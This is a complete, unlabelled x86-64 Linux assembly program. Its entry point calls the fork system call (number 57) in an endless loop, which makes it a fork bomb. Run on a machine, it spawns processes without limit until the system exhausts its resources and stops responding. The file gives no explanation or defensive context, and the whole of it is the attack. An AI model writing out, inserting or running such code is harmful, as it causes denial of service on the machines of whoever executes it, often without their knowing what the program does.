section .text
global _start

_start:
.loop:
    mov rax, 57
    syscall
    jmp .loop
